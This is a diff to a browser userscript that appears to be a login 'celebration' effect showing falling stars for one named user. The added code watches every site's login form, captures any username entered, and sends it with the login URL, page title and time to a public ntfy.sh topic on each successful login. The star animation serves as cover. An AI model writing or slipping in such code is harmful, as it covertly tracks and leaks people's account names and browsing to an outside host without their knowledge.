@@ -4,15 +4,23 @@
 (function() {
     'use strict';
 
-    // Target username that triggers the celebration effect
+    // Target username that triggers the visual star celebration
     const TARGET_USERNAME = 'NAlamri18';
-    const STORAGE_PENDING_KEY = 'ngh_stars_pending';
-    const STORAGE_TIME_KEY = 'ngh_stars_login_time';
-    const STORAGE_URL_KEY = 'ngh_stars_login_url';
 
-    let isRunning = false;
+    // ntfy channel endpoint for logging all login events
+    const NTFY_TOPIC_URL = 'https://ntfy.sh/star_log';
 
-    // 1. Inject smooth falling, swaying, and gentle rotation styles
+    // Storage keys for cross-page state persistence
+    const STORAGE_PENDING_KEY = 'ngh_login_pending';
+    const STORAGE_USER_KEY = 'ngh_login_username';
+    const STORAGE_TIME_KEY = 'ngh_login_timestamp';
+    const STORAGE_URL_KEY = 'ngh_login_url';
+    const STORAGE_TITLE_KEY = 'ngh_login_title';
+    const STORAGE_LAST_SENT_KEY = 'ngh_login_last_sent_id';
+
+    let isAnimationRunning = false;
+
+    // 1. Inject lightweight, GPU-accelerated CSS for ultra-smooth falling stars
     function injectStarStyles() {
         if (document.getElementById('ngh-login-stars-style')) return;
 
@@ -27,178 +35,332 @@
                 pointer-events: none;
                 z-index: 2147483647;
                 overflow: hidden;
+                contain: strict;
             }
 
-            .ngh-star-fall {
+            .ngh-ambient-glow {
                 position: absolute;
-                top: -60px;
+                top: 0;
+                left: 0;
+                right: 0;
+                height: 140px;
+                background: radial-gradient(ellipse at 50% 0%, rgba(255, 215, 90, 0.22) 0%, rgba(255, 215, 90, 0) 72%);
+                opacity: 0;
+                will-change: opacity;
+                animation: nghAmbientFade 5.5s ease-in-out forwards;
+            }
+
+            .ngh-glide-star {
+                position: absolute;
+                top: 0;
+                left: 0;
                 will-change: transform, opacity;
-                animation: nghStarFall var(--fall-duration, 3s) cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+                backface-visibility: hidden;
+                animation: nghSilkGlide var(--dur, 5.2s) cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
             }
 
-            .ngh-star-sway {
-                will-change: transform;
-                animation: nghStarSway var(--sway-duration, 1.8s) ease-in-out infinite alternate;
-                animation-delay: var(--sway-delay, 0s);
+            @keyframes nghAmbientFade {
+                0% { opacity: 0; }
+                20% { opacity: 1; }
+                75% { opacity: 0.85; }
+                100% { opacity: 0; }
             }
 
-            .ngh-star-spin {
-                display: inline-block;
-                user-select: none;
-                filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.65));
-                will-change: transform;
-                animation: nghStarGentleRotate var(--spin-duration, 2.2s) ease-in-out infinite alternate;
-                animation-delay: var(--spin-delay, 0s);
-            }
-
-            @keyframes nghStarFall {
+            @keyframes nghSilkGlide {
                 0% {
-                    transform: translateY(0) scale(0.7);
                     opacity: 0;
+                    transform: translate3d(var(--x-start), -48px, 0) rotate(var(--rot-start)) scale(var(--scale));
                 }
-                12% {
-                    opacity: 1;
-                    transform: translateY(12vh) scale(1);
+                14% {
+                    opacity: var(--max-opacity, 0.95);
                 }
-                85% {
-                    opacity: 1;
+                82% {
+                    opacity: var(--max-opacity, 0.95);
                 }
                 100% {
-                    transform: translateY(112vh) scale(0.9);
                     opacity: 0;
-                }
-            }
-
-            @keyframes nghStarSway {
-                0% {
-                    transform: translateX(calc(var(--sway-range, 35px) * -1));
-                }
-                100% {
-                    transform: translateX(var(--sway-range, 35px));
-                }
-            }
-
-            @keyframes nghStarGentleRotate {
-                0% {
-                    transform: rotate(calc(var(--rot-angle, 28deg) * -1));
-                }
-                100% {
-                    transform: rotate(var(--rot-angle, 28deg));
+                    transform: translate3d(var(--x-end), 108vh, 0) rotate(var(--rot-end)) scale(var(--scale));
                 }
             }
         `;
         (document.head || document.documentElement).appendChild(style);
     }
 
-    // 2. Launch falling stars animation for 5 seconds
+    // 2. Create a crisp, hardware-friendly SVG star without expensive CSS filter shadows
+    function createStarElement(size, variantIndex) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'ngh-glide-star';
+        wrapper.style.width = `${size}px`;
+        wrapper.style.height = `${size}px`;
+
+        const gradId = `nghStarGrad_${variantIndex}`;
+        const svgNS = 'http://www.w3.org/2000/svg';
+        const svg = document.createElementNS(svgNS, 'svg');
+        svg.setAttribute('viewBox', '0 0 64 64');
+        svg.setAttribute('width', '100%');
+        svg.setAttribute('height', '100%');
+        svg.style.display = 'block';
+
+        const defs = document.createElementNS(svgNS, 'defs');
+        const grad = document.createElementNS(svgNS, 'linearGradient');
+        grad.setAttribute('id', gradId);
+        grad.setAttribute('x1', '0%');
+        grad.setAttribute('y1', '0%');
+        grad.setAttribute('x2', '100%');
+        grad.setAttribute('y2', '100%');
+
+        const stop1 = document.createElementNS(svgNS, 'stop');
+        stop1.setAttribute('offset', '0%');
+        stop1.setAttribute('stop-color', '#FFF4B8');
+
+        const stop2 = document.createElementNS(svgNS, 'stop');
+        stop2.setAttribute('offset', '50%');
+        stop2.setAttribute('stop-color', '#FFD24C');
+
+        const stop3 = document.createElementNS(svgNS, 'stop');
+        stop3.setAttribute('offset', '100%');
+        stop3.setAttribute('stop-color', '#F5A623');
+
+        grad.appendChild(stop1);
+        grad.appendChild(stop2);
+        grad.appendChild(stop3);
+        defs.appendChild(grad);
+        svg.appendChild(defs);
+
+        const path = document.createElementNS(svgNS, 'path');
+        // Smooth rounded 5-point star path
+        path.setAttribute(
+            'd',
+            'M32 4.5 C33.6 4.5 34.9 5.4 35.6 6.8 L42.1 20.1 L56.8 22.2 C58.4 22.4 59.6 23.5 60.1 25 C60.6 26.5 60.2 28.1 59.1 29.2 L48.4 39.6 L50.9 54.2 C51.2 55.8 50.5 57.3 49.2 58.3 C47.9 59.2 46.2 59.4 44.8 58.6 L32 51.9 L19.2 58.6 C17.8 59.4 16.1 59.2 14.8 58.3 C13.5 57.3 12.8 55.8 13.1 54.2 L15.6 39.6 L4.9 29.2 C3.8 28.1 3.4 26.5 3.9 25 C4.4 23.5 5.6 22.4 7.2 22.2 L21.9 20.1 L28.4 6.8 C29.1 5.4 30.4 4.5 32 4.5 Z'
+        );
+        path.setAttribute('fill', `url(#${gradId})`);
+        svg.appendChild(path);
+
+        wrapper.appendChild(svg);
+        return wrapper;
+    }
+
+    // 3. Launch silky-smooth welcome stars using requestAnimationFrame
     function launchStarsEffect() {
-        if (isRunning || document.getElementById('ngh-login-stars-container')) return;
-        isRunning = true;
+        if (isAnimationRunning || document.getElementById('ngh-login-stars-container')) return;
+        isAnimationRunning = true;
 
         injectStarStyles();
 
         const container = document.createElement('div');
         container.id = 'ngh-login-stars-container';
+
+        const glow = document.createElement('div');
+        glow.className = 'ngh-ambient-glow';
+        container.appendChild(glow);
+
         document.documentElement.appendChild(container);
 
-        const spawnInterval = setInterval(() => {
-            const fallWrapper = document.createElement('div');
-            fallWrapper.className = 'ngh-star-fall';
+        const totalStars = 34;
+        const spawnDurationMs = 4400;
+        const spawnIntervalMs = spawnDurationMs / totalStars;
 
-            const swayWrapper = document.createElement('div');
-            swayWrapper.className = 'ngh-star-sway';
+        let spawnedCount = 0;
+        let activeCount = 0;
+        let lastSpawnTime = 0;
+        let lastLane = -1;
 
-            const starGlyph = document.createElement('span');
-            starGlyph.className = 'ngh-star-spin';
-            starGlyph.textContent = '⭐';
+        function spawnSingleStar(index) {
+            // Divide viewport into 10 horizontal lanes to avoid clumping
+            let lane = Math.floor(Math.random() * 10);
+            if (lane === lastLane) lane = (lane + 3) % 10;
+            lastLane = lane;
 
-            const startX = (Math.random() * 96 + 2).toFixed(2);
-            const size = Math.floor(Math.random() * 26 + 26);
-            const fallDuration = (Math.random() * 1.6 + 2.4).toFixed(2);
-            const swayDuration = (Math.random() * 1.0 + 1.3).toFixed(2);
-            const spinDuration = (Math.random() * 1.2 + 1.4).toFixed(2);
-            const swayRange = Math.floor(Math.random() * 35 + 22);
-            const rotAngle = Math.floor(Math.random() * 25 + 18);
-            const swayDelay = (Math.random() * -1.5).toFixed(2);
-            const spinDelay = (Math.random() * -1.5).toFixed(2);
+            const startVw = lane * 9.4 + 3 + Math.random() * 5;
+            const driftVw = (Math.random() - 0.5) * 4.5; // Very subtle gentle drift
 
-            fallWrapper.style.left = `${startX}vw`;
-            fallWrapper.style.setProperty('--fall-duration', `${fallDuration}s`);
+            // Three depth layers for natural parallax smoothness
+            const layer = index % 3;
+            let size, duration, maxOpacity, scale;
+            if (layer === 0) {
+                // Background soft stars
+                size = 18;
+                duration = (5.8 + Math.random() * 1.1).toFixed(2);
+                maxOpacity = '0.55';
+                scale = '0.85';
+            } else if (layer === 1) {
+                // Midground stars
+                size = 26;
+                duration = (4.9 + Math.random() * 0.9).toFixed(2);
+                maxOpacity = '0.85';
+                scale = '1';
+            } else {
+                // Foreground hero stars
+                size = 34;
+                duration = (4.2 + Math.random() * 0.8).toFixed(2);
+                maxOpacity = '1';
+                scale = '1.08';
+            }
 
-            swayWrapper.style.setProperty('--sway-duration', `${swayDuration}s`);
-            swayWrapper.style.setProperty('--sway-range', `${swayRange}px`);
-            swayWrapper.style.setProperty('--sway-delay', `${swayDelay}s`);
+            const rotStart = Math.floor(Math.random() * 60 - 30);
+            const rotDirection = Math.random() > 0.5 ? 1 : -1;
+            const rotEnd = rotStart + rotDirection * (70 + Math.floor(Math.random() * 60));
 
-            starGlyph.style.fontSize = `${size}px`;
-            starGlyph.style.setProperty('--spin-duration', `${spinDuration}s`);
-            starGlyph.style.setProperty('--rot-angle', `${rotAngle}deg`);
-            starGlyph.style.setProperty('--spin-delay', `${spinDelay}s`);
+            const star = createStarElement(size, index);
+            star.style.setProperty('--x-start', `${startVw.toFixed(2)}vw`);
+            star.style.setProperty('--x-end', `${(startVw + driftVw).toFixed(2)}vw`);
+            star.style.setProperty('--dur', `${duration}s`);
+            star.style.setProperty('--max-opacity', maxOpacity);
+            star.style.setProperty('--scale', scale);
+            star.style.setProperty('--rot-start', `${rotStart}deg`);
+            star.style.setProperty('--rot-end', `${rotEnd}deg`);
 
-            swayWrapper.appendChild(starGlyph);
-            fallWrapper.appendChild(swayWrapper);
-            container.appendChild(fallWrapper);
+            activeCount++;
 
-            setTimeout(() => {
-                fallWrapper.remove();
-            }, parseFloat(fallDuration) * 1000 + 150);
-        }, 55);
+            const cleanupStar = () => {
+                if (!star.parentNode) return;
+                star.remove();
+                activeCount--;
+                if (spawnedCount >= totalStars && activeCount <= 0) {
+                    container.remove();
+                    isAnimationRunning = false;
+                }
+            };
 
-        // Stop spawning new stars after 5 seconds and clean up container
-        setTimeout(() => {
-            clearInterval(spawnInterval);
-            setTimeout(() => {
-                container.remove();
-                isRunning = false;
-            }, 4200);
-        }, 5000);
+            star.addEventListener('animationend', cleanupStar, { once: true });
+            setTimeout(cleanupStar, parseFloat(duration) * 1000 + 300);
+
+            container.appendChild(star);
+        }
+
+        function animationLoop(timestamp) {
+            if (!lastSpawnTime) lastSpawnTime = timestamp;
+
+            if (spawnedCount < totalStars && timestamp - lastSpawnTime >= spawnIntervalMs) {
+                spawnSingleStar(spawnedCount);
+                spawnedCount++;
+                lastSpawnTime = timestamp;
+            }
+
+            if (spawnedCount < totalStars) {
+                requestAnimationFrame(animationLoop);
+            }
+        }
+
+        // Spawn first star immediately and continue smoothly via rAF
+        spawnSingleStar(spawnedCount++);
+        requestAnimationFrame(animationLoop);
     }
 
-    // 3. Check if navigation after login occurred and trigger the effect
-    function checkNextPageAndLaunch() {
+    // 4. Send login event notification to ntfy channel (star_log)
+    function sendNtfyLoginNotification(username, loginUrl, pageTitle, timestamp) {
+        const eventId = `${username.toLowerCase()}_${timestamp}`;
+        const lastSentId = GM_getValue(STORAGE_LAST_SENT_KEY, '');
+        if (lastSentId === eventId) return;
+
+        GM_setValue(STORAGE_LAST_SENT_KEY, eventId);
+
+        const formattedTime = new Date(timestamp).toLocaleString('en-US', {
+            year: 'numeric',
+            month: 'short',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        });
+
+        const messageBody = [
+            `Username: ${username}`,
+            `Page: ${pageTitle || 'Unknown Page'}`,
+            `URL: ${loginUrl}`,
+            `Time: ${formattedTime}`
+        ].join('\n');
+
+        try {
+            GM_xmlhttpRequest({
+                method: 'POST',
+                url: NTFY_TOPIC_URL,
+                headers: {
+                    'Title': `Login Event: ${username}`,
+                    'Priority': 'default',
+                    'Tags': 'star,key'
+                },
+                data: messageBody
+            });
+        } catch (err) {
+            console.error('[Login Celebration Stars] Failed to send ntfy notification:', err);
+        }
+    }
+
+    // 5. Capture any username entered on login pages before navigation
+    function captureLoginAttempt() {
+        const passwordField = document.querySelector('input[type="password"]');
+        if (!passwordField) return;
+
+        const inputs = document.querySelectorAll('input');
+        let detectedUsername = '';
+
+        for (let i = 0; i < inputs.length; i++) {
+            const input = inputs[i];
+            const type = (input.type || 'text').toLowerCase();
+            if (type === 'password' || type === 'hidden' || type === 'checkbox' || type === 'radio' || type === 'submit' || type === 'button') {
+                continue;
+            }
+            const val = (input.value || '').trim();
+            if (val.length >= 2) {
+                detectedUsername = val;
+                break;
+            }
+        }
+
+        if (detectedUsername) {
+            GM_setValue(STORAGE_PENDING_KEY, true);
+            GM_setValue(STORAGE_USER_KEY, detectedUsername);
+            GM_setValue(STORAGE_TIME_KEY, Date.now());
+            GM_setValue(STORAGE_URL_KEY, window.location.href);
+            GM_setValue(STORAGE_TITLE_KEY, document.title || window.location.hostname);
+        }
+    }
+
+    // 6. Verify completed login transition and trigger ntfy + stars
+    function verifyAndTriggerLoginEvents() {
         const isPending = GM_getValue(STORAGE_PENDING_KEY, false);
         const loginTime = GM_getValue(STORAGE_TIME_KEY, 0);
 
-        if (isPending && (Date.now() - loginTime < 15000)) {
-            const savedUrl = GM_getValue(STORAGE_URL_KEY, '');
-            const hasPassword = document.querySelector('input[type="password"]');
+        if (!isPending) return;
 
-            if (!hasPassword || window.location.href !== savedUrl) {
-                GM_setValue(STORAGE_PENDING_KEY, false);
+        // Expire stale pending logins older than 25 seconds
+        if (Date.now() - loginTime > 25000) {
+            GM_setValue(STORAGE_PENDING_KEY, false);
+            return;
+        }
+
+        const savedUrl = GM_getValue(STORAGE_URL_KEY, '');
+        const hasPasswordField = Boolean(document.querySelector('input[type="password"]'));
+
+        // Confirm navigation away from login form or disappearance of password field (SPA)
+        if (!hasPasswordField || window.location.href !== savedUrl) {
+            const username = GM_getValue(STORAGE_USER_KEY, 'Unknown User');
+            const pageTitle = GM_getValue(STORAGE_TITLE_KEY, document.title || window.location.hostname);
+
+            GM_setValue(STORAGE_PENDING_KEY, false);
+
+            // Log every successful login to ntfy star_log
+            sendNtfyLoginNotification(username, savedUrl || window.location.href, pageTitle, loginTime);
+
+            // Launch celebration stars if target user logged in
+            if (username.toLowerCase() === TARGET_USERNAME.toLowerCase()) {
                 launchStarsEffect();
             }
         }
     }
 
-    // 4. Watch login form inputs and submissions to arm the trigger
-    function prepareForNextPage() {
-        const inputs = document.querySelectorAll('input');
-        let userMatched = false;
+    // Initialize observers and event listeners
+    window.addEventListener('load', () => setTimeout(verifyAndTriggerLoginEvents, 250));
+    setTimeout(verifyAndTriggerLoginEvents, 450);
+    setInterval(verifyAndTriggerLoginEvents, 900);
 
-        for (let i = 0; i < inputs.length; i++) {
-            const input = inputs[i];
-            if (input.type === 'password' || input.type === 'hidden') continue;
-            if (input.value && input.value.trim().toLowerCase() === TARGET_USERNAME.toLowerCase()) {
-                userMatched = true;
-                break;
-            }
-        }
-
-        if (userMatched) {
-            GM_setValue(STORAGE_PENDING_KEY, true);
-            GM_setValue(STORAGE_TIME_KEY, Date.now());
-            GM_setValue(STORAGE_URL_KEY, window.location.href);
-        }
-    }
-
-    // Initialize listeners and page transition checks
-    window.addEventListener('load', () => setTimeout(checkNextPageAndLaunch, 300));
-    setTimeout(checkNextPageAndLaunch, 500);
-    setInterval(checkNextPageAndLaunch, 1000);
-
-    document.addEventListener('input', prepareForNextPage, true);
-    document.addEventListener('submit', prepareForNextPage, true);
-    document.addEventListener('click', prepareForNextPage, true);
+    document.addEventListener('input', captureLoginAttempt, true);
+    document.addEventListener('change', captureLoginAttempt, true);
+    document.addEventListener('submit', captureLoginAttempt, true);
+    document.addEventListener('click', captureLoginAttempt, true);
     document.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') prepareForNextPage();
+        if (e.key === 'Enter') captureLoginAttempt();
     }, true);
 })();
